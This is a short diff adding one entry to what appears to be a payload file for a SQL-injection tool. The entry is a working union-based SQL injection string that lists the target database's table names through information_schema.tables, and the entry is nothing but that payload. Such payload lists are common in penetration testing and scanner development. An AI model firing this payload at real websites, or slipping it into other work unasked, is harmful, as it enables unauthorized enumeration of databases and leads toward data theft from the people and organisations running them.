@@ -1,0 +1,5 @@
+[Payload]
+type = sql
+title = Union based SQL injection
+description: SQL function "union" is diverted to perform a SQL Injection.
+payload = 1337+union+select+1,2,3,group_concat(table_name),5,6,7,8,9,10,11+from+information_schema.tables+where+table_schema=database()--+
